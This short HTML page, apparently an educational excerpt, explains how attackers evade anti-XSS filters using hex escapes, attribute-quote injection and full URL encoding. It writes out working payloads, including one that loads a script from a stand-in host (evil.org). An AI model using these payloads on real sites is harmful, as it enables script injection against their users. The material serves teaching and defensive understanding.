<title>Bypassing Anti-XSS Filters</title>
</head><body>One of the most popular alternative character representations is HTML escaped encoding. In this system, the HEX value of the ASCII character is prefixed with the “%” character.<br/>
<br/>

<br/>
<b>Consider</b>a routine that removes the “&lt;“ and “&gt;“ special characters: <br/>
document.write(cleanSearchString('&lt;&gt;'));<br/>
The attacker now uses an alternative coding for the filtered characters, “\x3c” and “\x3e” respectively, and initialises their code with “’) +” to escape out of the routine. <br/>
') + '\x3cscript src=http://evil.org/malicious.js\x3e\x3c/script\x3e'<br/>
<br/>
<b>Consider </b>a site that parses the content, <br/>
&lt;a href=&quot;javascript:…&quot;&gt;click-me&lt;/a&gt; <br/>
and, after processing, becomes: <br/>
&lt;a href=&quot;javascript:…&quot; target=&quot;_blank&quot;&gt;click-me&lt;/a&gt; <br/>
Causing the URL to be opened in a new window.<br/>
<br/>
However, if the attacker constructs his HREF as follows, <br/>
&lt;a href=&quot;javascript:...&quot; foo=&quot;bar&gt;click-me&lt;/a&gt; <br/>
it will be interpreted as: <br/>
&lt;a href=&quot;javascript:...&quot; foo=&quot;bar target=&quot;_blank&quot;&gt;click-me&lt;/a&gt; <br/>
causing the code to be executed in the same page, under the same DOM.<br/>
<br/>
<b>In cases</b>where almost all special characters have are filtered from user supplied strings, attackers must encode the entire attack string. <br/>
Consider the following URL: <br/>
http://trusted.org/search.cgi?query=%26%7balert%28%27EVIL %27%29%7d%3b&amp;apropos=pos2<br/>
<br/>
The “%26%7balert%28%27EVIL%27%29%7d%3b” resolves to &amp;{alert('EVIL')}; causing in this instance an unexpected JavaScript alert window to popup, with the text “EVIL”.</body></html>
